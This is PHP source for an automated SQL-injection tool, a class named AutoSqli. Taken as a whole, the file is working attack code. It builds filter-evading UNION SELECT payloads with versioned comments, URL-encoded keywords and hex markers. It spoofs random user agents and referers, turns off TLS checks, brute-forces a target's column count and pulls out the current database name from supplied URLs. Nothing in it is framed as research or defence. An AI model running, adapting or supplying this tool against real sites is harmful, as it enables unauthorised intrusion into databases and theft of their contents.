<?php

require "vendor/autoload.php";
require "uagent.php";
require "referer.php";
error_reporting(0);

class AutoSqli
{

    protected $url                 = "";
    protected $url_injection       = "";
    protected $current_database    = "";
    protected $databases           = [];
    protected $tabels              = [];
    protected $columns             = [];
    protected $startSQLi           = "0x3C73716C692D68656C7065723E"; # <sqli-helper>
    protected $endSQLi             = "0x3C2F73716C692D68656C7065723E"; # </sqli-helper>
    protected $UnionPayload        = "/**666**/%41%4e%44/**666**/0/**666**//*!13337%55%6e%49o%4E*//**666**//*!13337s%45l%45c%54*//**666**/";
    protected $number_colum        = 0;
    protected $header              = [];
    protected $options_curl        = [];

    public function __construct()
    {
        // set header
        $this->header = array(
            'Connection: keep-alive',
            'Keep-Alive: ' . rand(110, 120),
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Upgrade-Insecure-Requests: 1',
            'Accept-Encoding: gzip, deflate, sdch',
            'Accept-Language: id-ID,id;q=0.8,en-US;q=0.6,en;q=0.4',
            'Cache-Control: no-cache',
            'Pragma: no-cache',

        );

        // set URL and other appropriate options
        $this->options_curl  = array(
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_ENCODING => 'gzip',
            CURLOPT_USERAGENT => UAgent::random(),
            CURLOPT_REFERER => Referer::random(),
            CURLOPT_HTTPHEADER => $this->header,
        );
    }

    public function setUrl($url)
    {
        $this->url = $url;
    }

    public function getUrl()
    {
        return $this->url;
    }

    public function strhex($string)
    {
        $hexstr = unpack('H*', $string);
        return array_shift($hexstr);
    }

    public function findnumbercolumn()
    {
        $mc = JMathai\PhpMultiCurl\MultiCurl::getInstance();
        $tampung_semua = array();
        $pisah = explode("=", $this->url);
        $this->url_injection = "{$pisah[0]}=-{$pisah[1]}";

        $tampung_angka = "";

        for ($i = 1; $i <= 100; $i++) {
            $tampung_angka .= "/*!50000%43o%4Ec%41t/**12345**/(0x73716c6920696e646f736563)*/" . ",";

            $full_url = "{$this->url_injection}{$this->UnionPayload}" . rtrim($tampung_angka, ",") . "+--+-";
            $full_url1 = "{$this->url_injection}'{$this->UnionPayload}" . rtrim($tampung_angka, ",") . "+--+-";

            array_push($tampung_semua, $full_url);
            array_push($tampung_semua, $full_url1);
        }

        foreach ($tampung_semua as $link_exp) {
            if (!$ch = curl_init($link_exp));
            curl_setopt_array($ch, $this->options_curl);
            $respones = $mc->addCurl($ch);

            $resut = $respones->response;

            preg_match("/sqli indosec/si", strip_tags($resut), $match,  PREG_OFFSET_CAPTURE, 0);

            if ($match[0][0] == "") {
                $this->number_colum += 1;
            }

            if ($match[0][0] != "") {
                break 1;
            }
        }
    }

    public function getnumbercolumn()
    {
        $this->number_colum = (int) ($this->number_colum / 2) + 1;
        return  $this->number_colum;
    }

    public function findcurrentdatabase()
    {
        $mc = JMathai\PhpMultiCurl\MultiCurl::getInstance();
        $tampung_semua = array();
        $tampung_angka = "";

        for ($i = 1; $i <= $this->number_colum; $i++) {
            $tampung_angka .= "/*!50000%43o%4Ec%41t/**12345**/({$this->startSQLi},/*!12345%44a%54a%42a%53e*/(),{$this->endSQLi})" . ",";

            $full_url = "{$this->url_injection}{$this->UnionPayload}" . rtrim($tampung_angka, ",") . "+--+-";
            $full_url1 = "{$this->url_injection}'{$this->UnionPayload}" . rtrim($tampung_angka, ",") . "+--+-";

            array_push($tampung_semua, $full_url);
            array_push($tampung_semua, $full_url1);
        }

        foreach ($tampung_semua as $link_exp) {
            if (!$ch = curl_init($link_exp));
            curl_setopt_array($ch, $this->options_curl);
            $respones = $mc->addCurl($ch);

            $resut = $respones->response;
            preg_match('/<sqli-helper>(.*?)<\/sqli-helper>/si', $resut, $match,  PREG_OFFSET_CAPTURE, 0);

            if ($match[1][0] != "") {
                $this->current_database = $match[1][0];
            }
        }
    }

    public function getcurrentdatabase()
    {
        return $this->current_database;
    }
}
